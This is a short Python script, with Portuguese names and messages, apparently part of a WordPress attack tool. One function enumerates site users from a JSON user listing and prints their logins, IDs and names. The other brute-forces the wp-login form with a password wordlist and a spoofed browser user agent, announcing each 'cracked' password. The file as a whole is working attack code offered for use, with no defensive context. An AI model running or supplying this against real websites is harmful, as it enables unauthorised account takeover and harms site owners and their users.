import colorama # pip3 install colorama
from colorama import Fore as F
import requests as r # pip3 install requests
import json as js

def enumerar(url):
	injeta = r.get(url)
	todos_usuarios = js.loads(injeta.text)
	for usuario in todos_usuarios:
		usu = usuario["slug"].replace("-", ".")
		print("\n" + F.GREEN + "Usuario: " + F.WHITE + usu)
		print(F.GREEN + "    ID: " + F.WHITE + str(usuario["id"]))
		print(F.GREEN + "    Nome: " + F.WHITE + usuario["name"])
		print(F.GREEN + "    Rede Social: " + F.WHITE + usuario["url"])
def brute_ataque(url, usuario, wordlist, verbose, time):
	user_agent = {'User-agent': 'Mozilla/5.0'}
	for senha in wordlist:
		payload = {"log" : usuario, "pwd" : senha}
		if verbose == 0:
			try:
				envia = r.post(url, headers=user_agent, data=payload, timeout = time)
				if "wp-login.php?action=lostpassword" in envia.text:
					continue
				else:
					print(F.GREEN + "[!]" + F.WHITE + " Senha quebrada com sucesso!!!\n    Senha: {}".format(senha))
					exit()
			except Exception as vx:
				print(F.RED + "ERRO DE CONEXAO... {}".format(vx))
		else:
			try:
				envia = r.post(url, headers=user_agent, data=payload, timeout = time)
				if "wp-login.php?action=lostpassword" in envia.text:
					print(F.RED + "[ERRO]" + F.WHITE + " Senha: {}".format(senha))
				else:
					print(F.GREEN + "[!]" + F.WHITE + " Senha quebrada com sucesso!!!\n    Senha: {}".format(senha))
					exit()
			except Exception as vx:
				print(F.RED + "ERRO DE CONEXAO... {}".format(vx))
